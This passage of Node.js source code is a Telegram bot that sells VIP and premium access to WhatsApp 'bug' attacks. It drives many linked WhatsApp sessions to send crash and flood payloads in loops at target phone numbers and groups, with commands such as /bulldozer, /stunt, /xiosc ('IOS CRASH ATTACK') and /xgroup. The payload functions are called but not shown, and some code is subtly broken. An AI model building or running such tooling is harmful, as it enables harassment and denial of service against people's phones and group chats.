      "Format durasi salah!\nGunakan: h=jam, d=hari, w=minggu, m=bulan\nContoh: 30d untuk 30 hari",
      { parse_mode: "Markdown" }
    );
  }

  const vipData = loadVipData();
  const expiry = Date.now() + durationMs;

  vipData[userId] = {
    expiry,
    addedBy: senderId,
    addedAt: Date.now(),
  };

  saveVipData(vipData);

  const expiryDate = new Date(expiry).toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "short",
  });

  await bot.sendMessage(
    chatId,
    `✅ VIP berhasil ditambahkan:\n🆔 ID: ${userId}\n⏳ Expired: ${expiryDate}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/bulldozer (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("bulldozer");
      isPremOnly = settings.premOnly?.includes("bulldozer");
      isOwnerOnly = settings.ownerOnly?.includes("bulldozer");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isInCooldown(userId)) {
    const remaining = getCooldownRemaining(userId);
    return bot.sendMessage(
      chatId,
      ` Anda sedang cooldown!\nSilakan coba lagi dalam *${remaining} detik*.`,
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `bulldozer_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ BULLDOZER ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: options.reply_markup,
  });
});

bot.onText(/\/xgroup (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pengguna premium yang bisa menggunakan perintah ini.",
      { parse_mode: "Markdown" }
    );
  }

  const input = match[1].trim();
  const inviteCode = input.match(/chat\.whatsapp\.com\/([\w\d]+)/i)?.[1];

  if (!inviteCode) {
    return bot.sendMessage(
      chatId,
      "❌ *Link grup tidak valid.*\nContoh yang benar:\n`/xgroup https://chat.whatsapp.com/ABCDE12345ZXY`",
      { parse_mode: "Markdown" }
    );
  }

  let joinedBots = 0;
  let failedBots = 0;

  for (const [botNumber, sheesh] of sessions.entries()) {
    try {
      const result = await sheesh.groupAcceptInvite(inviteCode);
      if (result) {
        joinedBots++;
      } else {
        failedBots++;
      }
    } catch (err) {
      failedBots++;
    }
  }

  await bot.sendPhoto(chatId, sending, {
  caption: `\`\`\`
╭═════════════════⚉
│ ⚘ XGROUP JOIN REPORT ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Link   : ${input}
│ Bot Aktif   : ${sessions.size}
│ Berhasil    : ${joinedBots}
│ Gagal       : ${failedBots}
╰═════════════════⚉
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "SEND BUG", callback_data: `xgroup_${inviteCode}` }]
    ]
  }
});
});

bot.onText(/\/xcomu (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("bulldozer");
      isPremOnly = settings.premOnly?.includes("bulldozer");
      isOwnerOnly = settings.ownerOnly?.includes("bulldozer");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isInCooldown(userId)) {
    const remaining = getCooldownRemaining(userId);
    return bot.sendMessage(
      chatId,
      ` Anda sedang cooldown!\nSilakan coba lagi dalam *${remaining} detik*.`,
      { parse_mode: "Markdown" }
    );
  }

  const input = match[1];
  if (!input.includes("chat.whatsapp.com/")) {
    return bot.sendMessage(chatId, "❌ Link undangan tidak valid.");
  }

  const inviteCode = input.split("/").pop().replace(/[^a-zA-Z0-9]/g, "");

  let joined = false;
  let foundJid = null;
  let joinedBotNumber = null;
  let isCommunity = false;

  for (const [botNum, sheesh] of sessions.entries()) {
    try {
      const groupMeta = await sheesh.groupGetInviteInfo(inviteCode);

      if (groupMeta?.id) {
        foundJid = groupMeta.id;

        try {
          await sheesh.groupAcceptInvite(inviteCode);
          joined = true;
          joinedBotNumber = botNum;
        } catch (err) {
          const joinedChats = await sheesh.groupFetchAllParticipating();
          if (Object.keys(joinedChats).includes(groupMeta.id)) {
            joined = true;
            joinedBotNumber = botNum;
          }
        }

        if (joined) {
          const metadata = await sheesh.groupMetadata(groupMeta.id);
          isCommunity = metadata?.parentGroupId ? true : false;
          break;
        }
      }
    } catch (e) {
      continue;
    }
  }

  if (!joined || !foundJid) {
    return bot.sendMessage(
      chatId,
      "❌ *Gagal akses grup.*\nBot tidak bisa join atau belum tergabung di grup tersebut.",
      { parse_mode: "Markdown" }
    );
  }

  const caption = `\`\`\`
╭═════════════════⚉
│ ⚘ XCOMU ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Grup JID   : ${foundJid}
│ Komunitas  : ${isCommunity ? "✅ Ya" : "❌ Tidak"}
│ Status     : ${joined ? "✅ Bot Sudah Join" : "❌ Belum"}
│ Bot Aktif  : ${sessions.size}
╰═════════════════⚉
\`\`\``;

  await bot.sendPhoto(chatId, sending, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xcomu_${foundJid}` }]
      ]
    }
  });
});


bot.onText(/\/multimate (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("bulldozer");
      isPremOnly = settings.premOnly?.includes("bulldozer");
      isOwnerOnly = settings.ownerOnly?.includes("bulldozer");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isInCooldown(userId)) {
    const remaining = getCooldownRemaining(userId);
    return bot.sendMessage(
      chatId,
      ` Anda sedang cooldown!\nSilakan coba lagi dalam *${remaining} detik*.`,
      { parse_mode: "Markdown" }
    );
  }

  const input = match[1];
  const rawNumbers = input.split(",");
  const targets = rawNumbers
    .map((n) => n.replace(/[^0-9]/g, ""))
    .filter((n) => n.length > 5);

  if (targets.length === 0) {
    return bot.sendMessage(
      chatId,
      "❌ *Format salah.*\nGunakan format:\n`/multimate 6281234,6285678,...`",
      { parse_mode: "Markdown" }
    );
  }

  const callbackData = `multimate_${targets.join("_")}`;

  const caption = `\`\`\`
╭═════════════════⚉
│ ⚘ MULTIMATE ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Total Target : ${targets.length}
│ Bot Ready    : ${sessions.size}
╰═════════════════⚉
\`\`\``;

  await bot.sendPhoto(chatId, sending, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: callbackData }]
      ],
    },
  });
});

bot.onText(/\/stunt (\d+)\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("bulldozer");
      isPremOnly = settings.premOnly?.includes("bulldozer");
      isOwnerOnly = settings.ownerOnly?.includes("bulldozer");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isInCooldown(userId)) {
    const remaining = getCooldownRemaining(userId);
    return bot.sendMessage(
      chatId,
      ` Anda sedang cooldown!\nSilakan coba lagi dalam *${remaining} detik*.`,
      { parse_mode: "Markdown" }
    );
  }
  const target = match[1].replace(/[^0-9]/g, "");
  const rawDuration = match[2].trim().toLowerCase();

  let durationMs;
  if (rawDuration.endsWith("jam")) {
    const jam = parseInt(rawDuration);
    if (isNaN(jam) || jam <= 0) {
      return bot.sendMessage(chatId, "❌ Durasi tidak valid (contoh: `3jam`)", {
        parse_mode: "Markdown",
      });
    }
    durationMs = jam * 60 * 60 * 1000;
  } else if (rawDuration.endsWith("mnt")) {
    const menit = parseInt(rawDuration);
    if (isNaN(menit) || menit <= 0) {
      return bot.sendMessage(chatId, "❌ Durasi tidak valid (contoh: `30mnt`)", {
        parse_mode: "Markdown",
      });
    }
    durationMs = menit * 60 * 1000;
  } else {
    return bot.sendMessage(chatId, "❌ Format durasi salah.\nGunakan `3jam` atau `30mnt`", {
      parse_mode: "Markdown",
    });
  }

  const caption = `\`\`\`
╭═════════════════⚉
│ ⚘ STUNT ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target   : ${target}
│ Durasi   : ${rawDuration}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉
\`\`\``;

  await bot.sendPhoto(chatId, sending, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `stunt_${target}_${durationMs}` }],
      ],
    },
  });
});

bot.onText(/\/splash (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("bulldozer");
      isPremOnly = settings.premOnly?.includes("bulldozer");
      isOwnerOnly = settings.ownerOnly?.includes("bulldozer");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isInCooldown(userId)) {
    const remaining = getCooldownRemaining(userId);
    return bot.sendMessage(
      chatId,
      ` Anda sedang cooldown!\nSilakan coba lagi dalam *${remaining} detik*.`,
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `splash_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ SPLASH ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/xiosc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak akses premium untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xiosc_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ IOS CRASH ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/xiosi (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let isVipOnly = false;
  let isPremOnly = false;
  let isOwnerOnly = false;
 
 const isGlobalOwner = OWNER_ID.includes(userId.toString());
  const isLocalOwner = isOwner(userId);

  if (!isGlobalOwner && !isLocalOwner && !isVip(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, `❌ Anda tidak memiliki akses`, {
      parse_mode: "Markdown",
    });
  }

  try {
    const settingsPath = path.join(__dirname, "database", "settings.json");
    if (fs.existsSync(settingsPath)) {
      const settings = JSON.parse(fs.readFileSync(settingsPath));
      isVipOnly = settings.vipOnly?.includes("bulldozer");
      isPremOnly = settings.premOnly?.includes("bulldozer");
      isOwnerOnly = settings.ownerOnly?.includes("bulldozer");
    }
  } catch (err) {
    console.error("Gagal membaca settings.json:", err);
  }

  if (isOwnerOnly && !isOwner(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya bisa digunakan oleh Owner.*", {
      parse_mode: "Markdown",
    });
  }

  if (isVipOnly && !isOwner(userId) && !isVip(userId)) {
    return bot.sendMessage(chatId, " *Command ini hanya untuk VIP.*", {
      parse_mode: "Markdown",
    });
  }

  if (isPremOnly && !isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(chatId, "*Command ini hanya untuk Premium user.*", {
      parse_mode: "Markdown",
    });
  }

  if (isInCooldown(userId)) {
    const remaining = getCooldownRemaining(userId);
    return bot.sendMessage(
      chatId,
      ` Anda sedang cooldown!\nSilakan coba lagi dalam *${remaining} detik*.`,
      { parse_mode: "Markdown" }
    );
  }

  const [targetNumber] = match[1].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SEND BUG", callback_data: `xiosi_${formattedNumber}` }],
      ],
    },
  };

  await bot.sendPhoto(chatId, sending, {
    caption: `\`\`\`
╭═════════════════⚉
│ ⚘ IOS INVISIBLE ATTACK ⚘
╰═════════════════⚉
╭═════════════════⚉
│ Target: ${formattedNumber}
│ Bot Ready: ${sessions.size}
╰═════════════════⚉\`\`\``,
    reply_markup: options.reply_markup,
    parse_mode: "Markdown",
  });
});

bot.on("callback_query", async (query) => {
  const data = query.data;
  if (!data || !query.message) return;

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const name = query.from.username || query.from.first_name;

  // Menu handler
  if (data === "menu1") {
    await bot.editMessageCaption(
      `\`\`\`
╭═════════════════⚉
│   ⚘ 𝗕𝗟𝗔𝗖𝗞 𝗧𝗛𝗥𝗢𝗧𝗧𝗟𝗘 𝗕𝗢𝗧 ⚘
╰═════════════════⚉
╭═════════════════⚉
│ ⚘ BUG MENU ⚘
│ ⚉ /bulldozer <number>
│ ⚉ /multimate <number1>,<number2>
│ ⚉ /stunt <number> <3jam>
│ ⚉ /splash <number>
│ ⚉ /xiosc <number>
│ ⚉ /xiosi <number>
│ ⚉ /xgrup <link-group>
│ ⚉ /xcomu <link-group>
╰═════════════════⚉
╭═════════════════⚉
│   ⚘ 𝗕𝗟𝗔𝗖𝗞 𝗧𝗛𝗥𝗢𝗧𝗧𝗟𝗘 𝗕𝗢𝗧 ⚘
╰═════════════════⚉
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "BACK", callback_data: `backmenu` }]],
        },
      }
    );
    return;
  }

  if (data === "backmenu") {
    await bot.editMessageCaption(
      `\`\`\`
𝖲𝖫𝖨𝖯𝖤𝖱𝖸/𝖵𝖤𝖱𝖲𝖨𝖮𝖭
╭═════════════════⚉
│   ⚘ 𝗕𝗟𝗔𝗖𝗞 𝗧𝗛𝗥𝗢𝗧𝗧𝗟𝗘 𝗕𝗢𝗧 ⚘
╰═════════════════⚉
╭═════════════════⚉
│ ⚉ /menu
╰═════════════════⚉
╭═════════════════⚉
│   ⚘ 𝖶𝖤𝖫𝖢𝖮𝖬𝖤 @${name} ⚘
╰═════════════════⚉
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⚘ CHANNELS", url: "https://t.me/stxpos" }],
          ],
        },
      }
    );
    return;
  }

  // Attack command handler
  const [action, ...params] = data.split("_");
  let successCount = 0;
  let failCount = 0;

  if (action === "multimate") {
    const targets = params[0]?.split(",");
    if (!targets || targets.length === 0) return;

    for (const target of targets) {
      const jid = `${target}@s.whatsapp.net`;
      for (const [botNum, sheesh] of sessions.entries()) {
        try {
          for (let i = 0; i < 10; i++) {
            await bulldozer(sheesh, jid);
            await new Promise((r) => setTimeout(r, 500));
          }
          successCount++;
        } catch {
          failCount++;
        }
      }
    }
  } else if (action === "stunt") {
    const target = params[0];
    const duration = parseInt(params[1]) || 30;
    const jid = `${target}@s.whatsapp.net`;

    for (const [botNum, sheesh] of sessions.entries()) {
      try {
        for (let i = 0; i < duration; i++) {
          await bulldozer(sheesh, jid);
          await new Promise((r) => setTimeout(r, 1000));
        }
        successCount++;
      } catch {
        failCount++;
      }
    }
  } else if (action === "xgroup" || action === "xcomu") {
    const groupLink = params.join("_");

    for (const [botNum, sheesh] of sessions.entries()) {
      try {
        for (let i = 0; i < 500; i++) {
          await GroupUi(sheesh, groupLink);
          await new Promise((r) => setTimeout(r, 1000));
        }
        successCount++;
      } catch {
        failCount++;
      }
    }
  } else if (["bulldozer", "splash"].includes(action)) {
    const number = params[0];
    const jid = `${number}@s.whatsapp.net`;

    for (let step = 0; step <= 4; step++) {
      const percentage = (step / 4) * 100;
      const progressBar = "▓▓▓".repeat(step) + "░░░".repeat(4 - step);
      const isProcessing = percentage < 100;
      await bot.editMessageCaption(
        `\`\`\`
╭──────────────────────
│   ${isProcessing ? "      WAIT        " : "    PROCESSING     "}
│──────────────────────
│ Target: ${number}
│ ${
          isProcessing
            ? `Loading: [${progressBar} ${percentage.toFixed(0)}%]`
            : "Status: Sending Bug..."
        }
╰──────────────────────\`\`\``,
        {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "Markdown",
        }
      );
      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    for (const [botNum, sheesh] of sessions.entries()) {
      try {
        switch (action) {
          case "bulldozer":
            for (let i = 0; i < 50; i++) {
              await Warlock(sheesh, jid);
              await new Promise((r) => setTimeout(r, 500));
            }
            break;
          case "splash":
            for (let i = 0; i < 25; i++) {
              await CallUi(sheesh, jid);
              await QiBug(sheesh, jid);
              await new Promise((r) => setTimeout(r, 1000));
            }
            break;
        }
        successCount++;
      } catch {
        failCount++;
         console.error(`[❌] Failed to send to ${targetNumber}:`, err.message);
      }
    }
  }

  await bot.editMessageCaption(
    `\`\`\`
╭────────────────────────────
│ 🎯 Target: ${params.join(",")}
│ 🐞 Bug Type: ${action.toUpperCase()}
│ ✅ Success: ${successCount}
│ ❌ Failed: ${failCount}
│ 🤖 Total Bots: ${sessions.size}
╰────────────────────────────
\`\`\``,
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    }
  );

  await bot.answerCallbackQuery(query.id);
});

// ======[ FUNGSI PLACE ]==============

// exports consolidated at end
